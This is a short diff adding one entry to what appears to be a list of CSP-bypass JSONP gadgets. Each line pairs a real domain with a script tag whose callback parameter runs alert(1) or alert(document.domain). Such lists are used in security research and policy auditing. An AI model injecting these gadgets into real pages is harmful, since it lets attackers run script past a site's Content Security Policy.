@@ -207,3 +207,4 @@ yuedust.yuedu.126.net	<body ng-app ng-csp><script src="//yuedust.yuedu.126.net/j
 yugiohmonstrosdeduelo.blogspot.com	<script src="https://yugiohmonstrosdeduelo.blogspot.com/feeds/posts/summary?callback=alert"></script>
 zhike.help.360.cn	<script src="https://zhike.help.360.cn/api/v1/robotWindow?callback=alert(1)-"></script>
 zhuanjia.sogou.com	<script src="https://zhuanjia.sogou.com/base/ajax/login/login-init?callback=alert(1)-"></script>
+dev.virtualearth.net  <script src="https://dev.virtualearth.net/REST/v1/Imagery/Metadata/Road?jsonp=alert(document.domain);//"></script>
